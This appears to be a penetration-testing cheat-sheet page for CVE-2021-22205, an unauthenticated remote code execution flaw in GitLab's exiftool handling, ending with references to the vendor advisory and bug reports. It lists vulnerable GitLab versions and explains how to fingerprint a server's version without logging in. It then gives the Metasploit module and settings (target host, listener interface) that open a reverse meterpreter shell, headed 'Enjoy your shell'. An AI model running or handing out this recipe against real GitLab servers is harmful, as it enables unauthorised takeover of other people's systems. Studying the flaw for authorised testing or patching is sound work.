# Gitlab - Unauthenticated RCE with exiftool

## Requirements

This vulnerability affect the below **Gitlab CE/EE** versions:

- `>=11.9`, `<13.8.8`
- `>=13.9`, `<13.9.6`
- `>=13.10`, `<13.10.3`

## Exploitation

### Step 1: Try to find the version of Gitlab

First of all, before trying to exploit the rce, try to find the version of gitlab. 

- Authenticated: the version can often be found on `/help` endpoint with authenticated account.
    
    ![](imgs/gitlab_version.png)
    
- Unauthenticated: with recent version the `Whatâ€™s new` feature on `/help` endpoint show an approximative version without authentication. Found this menu clinking on `?` button on top right.
    
    ![](imgs/gitlab_approximative_version.png)
    
### Step 2: Setup metasploit
    
This RCE technique is available on metasploit.
    
```bash
use multi/http/gitlab_exif_rce
set RHOSTS 192.168.1.10
set LHOST wlan0
run
```

### Enjoy your shell

After running the metasploit module, if gitlab is vulnerable you will have an meterpreter session.

![](imgs/metasploit_gitlab_rce.png)


References

[Action needed by self-managed customers in response to CVE-2021-22205](https://about.gitlab.com/blog/2021/11/04/action-needed-in-response-to-cve2021-22205/)  
[Hackerone report](https://hackerone.com/reports/1154542)  
[Gitlab issue](https://gitlab.com/gitlab-org/gitlab/-/issues/327121)  